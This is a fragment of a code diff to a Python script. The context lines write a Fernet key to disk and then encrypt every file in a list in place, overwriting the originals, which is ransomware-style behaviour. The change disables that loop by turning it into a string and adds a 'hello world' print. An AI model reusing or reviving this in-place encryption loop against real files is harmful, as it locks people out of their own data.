@@ -26,9 +26,11 @@ with open("cryptkey.key", "wb") as cryptkey:
     cryptkey.write(key)
     
 for file in finalenc:
+    print("hello world")
+    """
     with open(file, "rb") as thefile:
         contents = thefile.read()
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
-        
+    """
